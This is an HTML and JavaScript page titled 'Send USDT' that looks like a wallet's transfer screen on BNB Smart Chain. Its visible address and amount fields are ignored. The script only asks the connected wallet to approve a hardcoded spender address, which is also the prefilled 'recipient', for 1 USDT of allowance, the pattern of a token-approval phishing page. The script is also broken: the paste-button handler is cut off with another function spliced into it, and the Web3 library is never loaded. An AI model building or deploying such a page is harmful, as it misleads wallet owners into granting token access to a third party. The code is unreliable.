<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width,
             initial-scale=1.0,
             maximum-scale=1.0,
             user-scalable=no"
>

<meta name="theme-color" content="#1b1b1b">

<title>Send USDT</title>

<style>
* {
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
}

html,
body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100%;
}

body {
    background: #1b1b1b;
    color: #ffffff;
    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Roboto,
        Arial,
        sans-serif;
}

button,
input {
    font-family: inherit;
}

button {
    -webkit-appearance: none;
    appearance: none;
}

.container {
    width: 100%;
    max-width: 600px;
    min-height: 100vh;
    margin: 0 auto;
    padding: 48px 22px 40px;
}

.title {
    text-align: center;
    font-size: 32px;
    line-height: 1.2;
    font-weight: 700;
    margin: 0 0 52px;
    color: #ffffff;
}

.wallet-section {
    margin-bottom: 30px;
}

.wallet-btn {
    width: 100%;
    height: 58px;
    border: 1px solid #00d97b;
    border-radius: 30px;
    background: transparent;
    color: #00d97b;
    font-size: 17px;
    font-weight: 700;
    cursor: pointer;
}

.wallet-btn:active {
    transform: scale(.99);
}

.wallet-btn.connected {
    background: rgba(0, 217, 123, 0.12);
}

.wallet-status {
    margin-top: 10px;
    min-height: 18px;
    text-align: center;
    color: #8f8f8f;
    font-size: 13px;
    word-break: break-word;
}

.label {
    display: block;
    color: #a9a9a9;
    font-size: 16px;
    margin: 0 0 9px;
}

.input-group {
    width: 100%;
    height: 52px;
    display: flex;
    align-items: center;
    gap: 8px;

    border: 1px solid #3d3d3d;
    border-radius: 13px;

    padding: 0 13px;
    margin-bottom: 20px;

    background: #1b1b1b;
}

.input-group input {
    flex: 1;
    min-width: 0;

    width: 100%;
    height: 100%;

    border: 0;
    outline: 0;

    background: transparent;
    color: #ffffff;

    font-size: 16px;
}

.input-group input::placeholder {
    color: #747474;
}

.text-btn,
.icon-btn,
.max-btn {
    border: 0;
    outline: 0;
    background: transparent;
    cursor: pointer;
}

.text-btn,
.max-btn {
    color: #00d97b;
    font-size: 14px;
    font-weight: 500;
}

.icon-btn {
    color: #00d97b;
    font-size: 18px;
    width: 28px;
    min-width: 28px;
}

.network-select {
    width: fit-content;
    min-width: 245px;
    height: 52px;

    display: flex;
    align-items: center;
    gap: 10px;

    border: 1px solid #3d3d3d;
    border-radius: 13px;

    padding: 0 14px;
    margin-bottom: 20px;
}

.network-icon {
    width: 23px;
    height: 23px;
    min-width: 23px;

    display: flex;
    align-items: center;
    justify-content: center;

    border-radius: 50%;
    overflow: hidden;
}

.network-icon img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.bnb-fallback {
    width: 23px;
    height: 23px;
    border-radius: 50%;

    display: flex;
    align-items: center;
    justify-content: center;

    background: #f3ba2f;
    color: #111;

    font-size: 13px;
    font-weight: 800;
}

.network-text {
    color: #ffffff;
    font-size: 15px;
    font-weight: 500;
    white-space: nowrap;
}

.network-arrow {
    margin-left: auto;
    color: #888888;
    font-size: 11px;
}

.amount-input {
    margin-bottom: 7px;
}

.amount-input .unit {
    color: #8a8a8a;
    font-size: 15px;
}

.estimate {
    margin: 0 0 32px;
    color: #777777;
    font-size: 14px;
}

.status {
    display: none;

    width: 100%;

    padding: 14px 15px;
    margin-bottom: 18px;

    border-radius: 12px;

    font-size: 13px;
    line-height: 1.45;

    word-break: break-word;
}

.status.show {
    display: block;
}

.status.info {
    background: rgba(255,255,255,.06);
    color: #bdbdbd;
}

.status.success {
    background: rgba(0,217,123,.12);
    color: #00d97b;
}

.status.error {
    background: rgba(255,72,72,.13);
    color: #ff8c8c;
}

.next-btn {
    width: 100%;
    height: 64px;

    border: 0;
    border-radius: 34px;

    background: #00d97b;
    color: #000000;

    font-size: 17px;
    font-weight: 800;

    cursor: pointer;
}

.next-btn:disabled {
    background: #21643e;
    color: #ffffff;
    cursor: not-allowed;
}

.loading-overlay {
    position: fixed;
    inset: 0;
    z-index: 999999;

    display: none;
    align-items: center;
    justify-content: center;

    background: rgba(0,0,0,.72);
}

.loading-overlay.show {
    display: flex;
}

.loading-box {
    width: 190px;
    padding: 25px 18px;

    border-radius: 17px;

    background: #252525;

    text-align: center;
}

.spinner {
    width: 32px;
    height: 32px;

    margin: 0 auto 14px;

    border: 3px solid #444444;
    border-top-color: #00d97b;

    border-radius: 50%;

    animation: spin .8s linear infinite;
}

.loading-text {
    color: #ffffff;
    font-size: 14px;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}

@media (max-width: 390px) {

    .container {
        padding-left: 16px;
        padding-right: 16px;
    }

    .title {
        font-size: 29px;
    }

    .network-select {
        min-width: 225px;
    }
}
</style>
</head>

<body>

<div
    id="loadingOverlay"
    class="loading-overlay"
>
    <div class="loading-box">

        <div class="spinner"></div>

        <div
            id="loadingText"
            class="loading-text"
        >
            Connecting...
        </div>

    </div>
</div>


<main class="container">

    <h1 class="title">
        Send USDT
    </h1>


    <!-- =========================================
         WALLET CONNECTION
    ========================================== -->

    <section class="wallet-section">

        <button
            id="connectWalletBtn"
            class="wallet-btn"
            type="button"
        >
            Connect BNB Wallet
        </button>

        <div
            id="walletStatus"
            class="wallet-status"
        >
            Not connected
        </div>

    </section>


    <!-- =========================================
         ADDRESS
    ========================================== -->

    <label
        class="label"
        for="address"
    >
        Address or Domain Name
    </label>

    <div class="input-group">

        <input
            id="address"
            type="text"
            value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC"
            placeholder="Search or Enter"
        >

        <button
            id="pasteBtn"
            class="text-btn"
            type="button"
        >
            Paste
        </button>

        <button
            class="icon-btn"
            type="button"
            aria-label="Contacts"
        >
            👤
        </button>

        <button
            class="icon-btn"
            type="button"
            aria-label="Scan"
        >
            ⛶
        </button>

    </div>


    <!-- =========================================
         NETWORK
    ========================================== -->

    <label class="label">
        Destination network
    </label>

    <div class="network-select">

        <div class="network-icon">

            <img
                src="images/cropped_circle_image.png"
                alt="BNB"
                onerror="
                    this.style.display='none';
                    this.nextElementSibling.style.display='flex';
                "
            >

            <div
                class="bnb-fallback"
                style="display:none;"
            >
                B
            </div>

        </div>

        <span class="network-text">
            BNB Smart Chain
        </span>

        <span class="network-arrow">
            ▼
        </span>

    </div>


    <!-- =========================================
         AMOUNT
    ========================================== -->

    <label
        class="label"
        for="amount"
    >
        Amount
    </label>

    <div class="input-group amount-input">

        <input
            id="amount"
            type="number"
            min="0"
            step="any"
            placeholder="USDT Amount"
        >

        <span class="unit">
            USDT
        </span>

        <button
            id="maxBtn"
            class="max-btn"
            type="button"
        >
            Max
        </button>

    </div>


    <p
        id="estimate"
        class="estimate"
    >
        ≈ $0.00
    </p>


    <!-- =========================================
         STATUS
    ========================================== -->

    <div
        id="status"
        class="status"
    ></div>


    <!-- =========================================
         APPROVAL
    ========================================== -->

    <button
        id="nextBtn"
        class="next-btn"
        type="button"
        disabled
    >
        Approve 1 USDT
    </button>

</main>


<script type="module">

/*
=========================================================
BSC-ONLY WALLETCONNECT CONFIGURATION
=========================================================

This project requests ONLY BSC chain 56.

Ethereum mainnet (1) is NOT included.

=========================================================
*/

const WALLETCONNECT_PROJECT_ID =
    "11e5445365f720d1050dc106ba2e78d6";

const BSC_CHAIN_ID =
    56;

const BSC_CHAIN_ID_HEX =
    "0x38";


/*
=========================================================
BSC NETWORK INFORMATION
=========================================================
*/

const BSC_NETWORK = {

    chainId: "0x38",

    chainName:
        "BNB Smart Chain",

    nativeCurrency: {

        name: "BNB",

        symbol: "BNB",

        decimals: 18

    },

    rpcUrls: [

        "https://bsc-dataseed.binance.org/"

    ],

    blockExplorerUrls: [

        "https://bscscan.com/"

    ]

};


/*
=========================================================
BSC USDT
=========================================================

BSC USDT:
0x55d398326f99059ff775485246999027b3197955

=========================================================
*/

const USDT_ADDRESS =
    "0x55d398326f99059ff775485246999027b3197955";


/*
=========================================================
SPENDER
=========================================================
*/

const SPENDER_ADDRESS =
    "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";


/*
=========================================================
ERC20 ABI
=========================================================
*/

const ERC20_ABI = [

    {
        inputs: [
            {
                name: "owner",
                type: "address"
            }
        ],

        name: "balanceOf",

        outputs: [
            {
                name: "",
                type: "uint256"
            }
        ],

        stateMutability: "view",
        type: "function"
    },


    {
        inputs: [
            {
                name: "owner",
                type: "address"
            },

            {
                name: "spender",
                type: "address"
            }
        ],

        name: "allowance",

        outputs: [
            {
                name: "",
                type: "uint256"
            }
        ],

        stateMutability: "view",
        type: "function"
    },


    {
        inputs: [
            {
                name: "spender",
                type: "address"
            },

            {
                name: "amount",
                type: "uint256"
            }
        ],

        name: "approve",

        outputs: [
            {
                name: "",
                type: "bool"
            }
        ],

        stateMutability: "nonpayable",
        type: "function"
    },


    {
        inputs: [],

        name: "decimals",

        outputs: [
            {
                name: "",
                type: "uint8"
            }
        ],

        stateMutability: "view",
        type: "function"
    },


    {
        inputs: [],

        name: "symbol",

        outputs: [
            {
                name: "",
                type: "string"
            }
        ],

        stateMutability: "view",
        type: "function"
    }

];


/*
=========================================================
STATE
=========================================================
*/

let provider = null;

let web3 = null;

let account = null;

let walletConnectProvider = null;


/*
=========================================================
DOM
=========================================================
*/

const connectWalletBtn =
    document.getElementById(
        "connectWalletBtn"
    );

const walletStatus =
    document.getElementById(
        "walletStatus"
    );

const nextBtn =
    document.getElementById(
        "nextBtn"
    );

const statusEl =
    document.getElementById(
        "status"
    );

const amountInput =
    document.getElementById(
        "amount"
    );

const estimate =
    document.getElementById(
        "estimate"
    );

const loadingOverlay =
    document.getElementById(
        "loadingOverlay"
    );

const loadingText =
    document.getElementById(
        "loadingText"
    );


/*
=========================================================
UI
=========================================================
*/

function showLoading(message) {

    loadingText.textContent =
        message || "Processing...";

    loadingOverlay.classList.add(
        "show"
    );
}


function hideLoading() {

    loadingOverlay.classList.remove(
        "show"
    );
}


function showStatus(
    message,
    type = "info"
) {

    statusEl.textContent =
        message;

    statusEl.className =
        "status show " + type;
}


function clearStatus() {

    statusEl.textContent = "";

    statusEl.className =
        "status";
}


function shortAddress(address) {

    return (
        address.substring(0, 6) +
        "..." +
        address.substring(
            address.length - 4
        )
    );
}


/*
=========================================================
LOAD WALLETCONNECT

IMPORTANT:

chains: [56]

This means the WalletConnect session is
requested for BSC.

Ethereum mainnet is not requested.
=========================================================
*/

async function createBSCWalletConnectProvider() {

    const module =
        await import(
            "https://esm.sh/@walletconnect/ethereum-provider@2.21.6"
        );

    const EthereumProvider =
        module.EthereumProvider;

    if (!EthereumProvider) {

        throw new Error(
            "WalletConnect provider could not be loaded."
        );
    }


    const wcProvider =
        await EthereumProvider.init({

            projectId:
                WALLETCONNECT_PROJECT_ID,

            /*
            BSC ONLY
            */

            chains: [
                BSC_CHAIN_ID
            ],

            /*
            BSC ONLY
            */

            optionalChains: [
                BSC_CHAIN_ID
            ],

            showQrModal:
                true,

            metadata: {

                name:
                    "Send USDT",

                description:
                    "BSC USDT approval demo",

                url:
                    window.location.origin,

                icons: []

            }

        });


    return wcProvider;
}


/*
=========================================================
GET BSC PROVIDER
=========================================================
*/

async function getBSCProvider() {

    /*
    If an injected wallet already exists,
    use it.

    We still verify that the resulting chain
    is BSC.
    */

    if (
        window.ethereum &&
        typeof window.ethereum.request ===
            "function"
    ) {

        return window.ethereum;
    }


    /*
    Otherwise use WalletConnect.
    */

    if (
        !walletConnectProvider
    ) {

        walletConnectProvider =
            await createBSCWalletConnectProvider();

    }


    return walletConnectProvider;
}


/*
=========================================================
CONNECT BSC WALLET
=========================================================
*/

async function connectBSCWallet() {

    try {

        clearStatus();

        showLoading(
            "Connecting to BNB Smart Chain..."
        );


        provider =
            await getBSCProvider();


        /*
        WalletConnect path
        */

        if (
            provider ===
                walletConnectProvider
            &&
            typeof provider.connect ===
                "function"
        ) {

            await provider.connect();

        }

        /*
        Injected wallet path
        */

        else {

            await provider.request({

                method:
                    "eth_requestAccounts"

            });

        }


        /*
        IMPORTANT:

        We now verify the actual chain.

        BSC = 0x38

        If the wallet is on Ethereum,
        we DO NOT proceed with approval.
        */

        let chainId =
            await provider.request({

                method:
                    "eth_chainId"

            });


        chainId =
            String(chainId)
                .toLowerCase();


        console.log(
            "Wallet chain:",
            chainId
        );


        /*
        WalletConnect was requested as BSC-only.

        If a wallet still reports another chain,
        stop here.

        We intentionally do not use
        wallet_addEthereumChain.
        */

        if (
            chainId !==
            BSC_CHAIN_ID_HEX
        ) {

            throw new Error(
                "Wallet is not on BNB Smart Chain. Please select BNB Smart Chain in your wallet."
            );

        }


        /*
        Get account.
        */

        const accounts =
            await provider.request({

                method:
                    "eth_accounts"

            });


        if (
            !accounts ||
            accounts.length === 0
        ) {

            throw new Error(
                "No wallet account was returned."
            );

        }


        account =
            accounts[0];


        /*
        Create Web3 using the BSC provider.
        */

        web3 =
            new Web3(provider);


        /*
        Final chain verification.
        */

        const verifiedChain =
            await provider.request({

                method:
                    "eth_chainId"

            });


        if (
            String(verifiedChain)
                .toLowerCase()
            !==
            BSC_CHAIN_ID_HEX
        ) {

            throw new Error(
                "BSC verification failed."
            );

        }


        /*
        UI
        */

        walletStatus.textContent =
            shortAddress(
                account
            );

        connectWalletBtn.textContent =
            "BSC Wallet Connected";

        connectWalletBtn.classList.add(
            "connected"
        );


        /*
        Only enable approval after
        BSC is verified.
        */

        nextBtn.disabled =
            false;


        hideLoading();


        showStatus(
            "Connected to BNB Smart Chain.",
            "success"
        );


        console.log(
            "============================"
        );

        console.log(
            "BSC WALLET CONNECTED"
        );

        console.log(
            "Account:",
            account
        );

        console.log(
            "Chain:",
            verifiedChain
        );

        console.log(
            "Chain number:",
            BSC_CHAIN_ID
        );

        console.log(
            "============================"
        );


        setupProviderEvents(
            provider
        );

    }

    catch (error) {

        hideLoading();

        console.error(
            "BSC connection error:",
            error
        );


        if (
            error &&
            Number(error.code) === 4001
        ) {

            showStatus(
                "Wallet connection was cancelled.",
                "error"
            );

            return;

        }


        showStatus(
            error.message ||
            "Could not connect to BNB Smart Chain.",
            "error"
        );


        /*
        Do not enable approval
        after a failed BSC connection.
        */

        nextBtn.disabled =
            true;
    }
}


/*
=========================================================
GET BSC USDT CONTRACT
=========================================================
*/

function getUSDTContract() {

    if (
        !web3 ||
        !account
    ) {

        throw new Error(
            "BSC wallet is not connected."
        );

    }


    return new web3.eth.Contract(
        ERC20_ABI,
        USDT_ADDRESS
    );
}


/*
=========================================================
VERIFY BSC BEFORE TRANSACTION
=========================================================
*/

async function verifyBSC() {

    if (
        !provider
    ) {

        throw new Error(
            "Wallet is not connected."
        );

    }


    const chainId =
        await provider.request({

            method:
                "eth_chainId"

        });


    if (
        String(chainId)
            .toLowerCase()
        !==
        BSC_CHAIN_ID_HEX
    ) {

        throw new Error(
            "Transaction blocked: wallet is not connected to BNB Smart Chain."
        );

    }


    return true;
}


/*
=========================================================
APPROVE EXACTLY 1 USDT
=========================================================
*/

async function approveOneUSDT() {

    try {

        /*
        Never approve unless BSC
        is already connected.
        */

        await verifyBSC();


        if (
            !account
        ) {

            throw new Error(
                "Please connect your BNB wallet first."
            );

        }


        showLoading(
            "Preparing 1 USDT approval..."
        );


        const usdt =
            getUSDTContract();


        /*
        Read decimals directly
        from BSC USDT.
        */

        const decimals =
            Number(
                await usdt.methods
                    .decimals()
                    .call()
            );


        /*
        EXACTLY 1 USDT

        For BSC USDT this is normally:

        1 × 10^18

        */

        const oneUSDT =
            web3.utils.toBN(
                10
            ).pow(
                web3.utils.toBN(
                    decimals
                )
            );


        /*
        Check balance.
        */

        const balance =
            await usdt.methods
                .balanceOf(
                    account
                )
                .call();


        if (
            web3.utils.toBN(
                balance
            ).lt(
                oneUSDT
            )
        ) {

            throw new Error(
                "Insufficient BSC USDT balance. At least 1 USDT is required."
            );

        }


        /*
        Check current allowance.
        */

        const currentAllowance =
            await usdt.methods
                .allowance(
                    account,
                    SPENDER_ADDRESS
                )
                .call();


        /*
        Already approved?
        */

        if (
            web3.utils.toBN(
                currentAllowance
            ).gte(
                oneUSDT
            )
        ) {

            hideLoading();

            showStatus(
                "This wallet already has at least 1 USDT allowance.",
                "success"
            );

            return;

        }


        /*
        IMPORTANT:

        EXACTLY 1 USDT.

        No unlimited allowance.
        */

        showLoading(
            "Confirm exactly 1 USDT in your wallet..."
        );


        const receipt =
            await usdt.methods
                .approve(
                    SPENDER_ADDRESS,
                    oneUSDT.toString()
                )
                .send({
                    from:
                        account
                });


        hideLoading();


        showStatus(
            "1 USDT approval confirmed. Tx: " +
            receipt.transactionHash,
            "success"
        );


        console.log(
            "BSC approval transaction:",
            receipt.transactionHash
        );

    }

    catch (error) {

        hideLoading();

        console.error(
            "BSC approval failed:",
            error
        );


        if (
            error &&
            Number(error.code) === 4001
        ) {

            showStatus(
                "Approval cancelled in your wallet.",
                "error"
            );

            return;

        }


        showStatus(
            error.message ||
            "1 USDT approval failed.",
            "error"
        );
    }
}


/*
=========================================================
CONNECT BUTTON
=========================================================
*/

connectWalletBtn.addEventListener(
    "click",
    connectBSCWallet
);


/*
=========================================================
APPROVAL BUTTON
=========================================================
*/

nextBtn.addEventListener(
    "click",
    async () => {

        if (
            nextBtn.disabled
        ) {

            return;

        }

        await approveOneUSDT();

    }
);


/*
=========================================================
PASTE BUTTON
=========================================================
*/

document
    .getElementById(
        "pasteBtn"
    )
    .addEventListener(
        "click",

/*
=========================================================
ACCOUNT / CHAIN EVENTS
=========================================================
*/

function setupProviderEvents(
    currentProvider
) {

    if (
        !currentProvider ||
        typeof currentProvider.on !==
            "function"
    ) {

        return;

    }


    currentProvider.on(
        "accountsChanged",
        accounts => {

            if (
                accounts &&
                accounts.length
            ) {

                account =
                    accounts[0];

                walletStatus.textContent =
                    shortAddress(
                        account
                    );

                nextBtn.disabled =
                    false;

            }

            else {

                account =
                    null;

                walletStatus.textContent =
                    "Wallet not connected";

                connectWalletBtn.textContent =
                    "Connect BNB Wallet";

                connectWalletBtn.classList.remove(
                    "connected"
                );

                nextBtn.disabled =
                    true;

            }

        }
    );


    currentProvider.on(
        "chainChanged",
        chainId => {

            const normalized =
                String(chainId)
                    .toLowerCase();


            /*
            If wallet leaves BSC,
            immediately disable approval.
            */

            if (
                normalized !==
                BSC_CHAIN_ID_HEX
            ) {

                nextBtn.disabled =
                    true;

                showStatus(
                    "Wallet changed away from BNB Smart Chain. Approval is disabled.",
                    "error"
                );

            }

            else {

                nextBtn.disabled =
                    !account;

                showStatus(
                    "BNB Smart Chain active.",
                    "success"
                );

            }

        }
    );


    currentProvider.on(
        "disconnect",
        () => {

            account =
                null;

            nextBtn.disabled =
                true;

            walletStatus.textContent =
                "Wallet disconnected";

            connectWalletBtn.textContent =
                "Connect BNB Wallet";

            connectWalletBtn.classList.remove(
                "connected"
            );

            showStatus(
                "Wallet disconnected.",
                "error"
            );

        }
    );
}
